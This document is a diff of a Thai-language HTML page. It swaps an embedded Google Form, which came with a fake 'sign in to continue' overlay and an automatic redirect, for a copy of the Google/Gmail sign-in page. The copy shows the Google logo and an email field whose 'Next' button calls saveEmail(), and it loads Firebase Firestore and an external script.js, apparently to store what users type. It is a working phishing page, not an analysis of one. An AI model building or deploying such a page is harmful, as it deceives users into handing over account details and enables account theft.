@@ -3,138 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ฟอร์มกิจกรรม</title>
+    <title>เข้าสู่ระบบ</title>
     <style>
         body {
             font-family: 'Roboto', Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f9f3e7;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            text-align: center;
-            position: relative;
+            background-color: #edf2f7;
+            margin: 0;
         }
-
-        .form-container {
-            width: 90%;
-            max-width: 800px;
-            height: 80vh;
-            background-color: white;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
-            border-radius: 8px;
-            padding: 20px;
-            position: relative;
-        }
-
-        iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-
-        /* ✅ กล่อง "ลงชื่อเข้าใช้" */
-        .message-box {
-            position: fixed;
-            bottom: 33%;
-            left: 49%;
-            transform: translateX(-50%);
-            background-color: white;
-            padding: 42px;
-            border: 2px solid #ccc;
-            border-radius: 8px;
+        .login-container {
+            display: flex;
+            flex-direction: column;
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-            width: 90%;
-            max-width: 300px;
+            width: 900px;
             text-align: left;
-            z-index: 9999;
         }
-
-        .message-box h3 {
-            margin-top: 0;
-            font-size: 20px;
+        .google-logo {
+            width: 100px;
+            margin-bottom: 20px;
         }
-
-        .message-box p {
+        h2 {
+            font-size: 24px;
+            margin: 0;
+            font-weight: 500;
+        }
+        .description {
+            font-size: 14px;
+            color: #555;
+            margin: 15px 0;
+        }
+        .input-box {
+            width: 100%;
+            padding: 12px;
+            margin-top: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
             font-size: 16px;
-            color: #333;
         }
-
-        .message-box a {
+        .forgot-link {
+            display: block;
+            margin-top: 10px;
             color: #1a73e8;
+            font-size: 14px;
             text-decoration: none;
         }
-
-        .message-box a:hover {
+        .forgot-link:hover {
             text-decoration: underline;
         }
-
-        .message-box .button-container {
+        .actions {
             display: flex;
-            justify-content: flex-end;
+            justify-content: space-between;
+            align-items: center;
             margin-top: 20px;
         }
-
-        .message-box .next-btn {
-            background-color: #e86c1a;
-            color: white;
-            padding: 12px 20px;
+        .register-btn {
+            background: none;
             border: none;
+            color: #1a73e8;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 5px;
+        }
+        .register-btn:hover {
+            text-decoration: underline;
+        }
+        .next-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 14px;
             border-radius: 5px;
             cursor: pointer;
-            font-size: 14px;
         }
-
-        .message-box .next-btn:hover {
-            background-color: #1669c1;
-        }
-
-        /* ปรับขนาดให้เหมาะกับมือถือ */
-        @media (max-width: 768px) {
-            .form-container {
-                height: 90vh;
-            }
-
-            .message-box {
-                width: 90%;
-            }
+        .next-btn:hover {
+            background: #1669c1;
         }
     </style>
 </head>
 <body>
-
-    <div class="form-container">
-        <iframe src="https://docs.google.com/forms/d/e/1FAIpQLSdQ_uaHQolMBnG_Kncbf9b6kcPHIZ1CShw2mSvDX9Ci4zw5Jg/viewform?embedded=true"
-                frameborder="0" id="googleForm"></iframe>
-    </div>
-
-    <!-- ✅ กล่อง "ลงชื่อเข้าใช้" -->
-    <div class="message-box">
-        <h3>ลงชื่อเข้าใช้เพื่อดำเนินการต่อ</h3>
-        <p>ต้องลงชื่อเข้าใช้เพื่อกรอกแบบฟอร์มนี้ โดยจะไม่มีการเก็บข้อมูลส่วนตัวของคุณ</p>
-        <a href="#">รายละเอียดเพิ่มเติม</a>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="google-logo">
+        <h2>ลงชื่อเข้าใช้</h2>
+        <p class="description">ด้วยบัญชี Google เพื่อไปยัง Gmail บัญชีนี้จะพร้อมใช้งานกับแอปอื่นๆ ของ Google ในเบราว์เซอร์</p>
         
-        <div class="button-container">
-            <button class="next-btn" id="loginButton">ลงชื่อเข้าใช้</button>
+        <!-- ฟอร์มรับอีเมล -->
+        <input type="text" id="email" class="input-box" placeholder="อีเมลหรือโทรศัพท์" required>
+        <a href="#" class="forgot-link">หากลืมอีเมล</a>
+        
+        <div class="actions">
+            <button type="button" class="register-btn">สร้างบัญชี</button>
+            <button type="button" class="next-btn" onclick="saveEmail()">ถัดไป</button>
         </div>
     </div>
 
-    <script>
-        // ✅ ฟังก์ชันเปลี่ยนหน้าอัตโนมัติหลังจาก 4 วินาที
-        setTimeout(function() {
-            window.location.href = "login.html"; // เปลี่ยนไปที่หน้า login.html
-        }, 2000); // 2000 มิลลิวินาที = 2 วินาที
+    <!-- Firebase SDK (ใช้ compat version) -->
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
 
-        // ✅ เมื่อกดปุ่ม "ลงชื่อเข้าใช้" จะเปลี่ยนหน้าทันที
-        document.getElementById('loginButton').addEventListener('click', function() {
-            document.getElementById('loginButton').innerText = "กำลังนำทาง..."; // แสดงข้อความ
-            setTimeout(function() {
-                window.location.href = "login.html"; // เปลี่ยนไปหน้า login.html
-            }, 1500); // 1.5 วินาที
-        });
-    </script>
-
-</body>
-</html>
+<!-- โหลด script.js หลังจาก Firebase SDK -->
+<script src="script.js"></script>
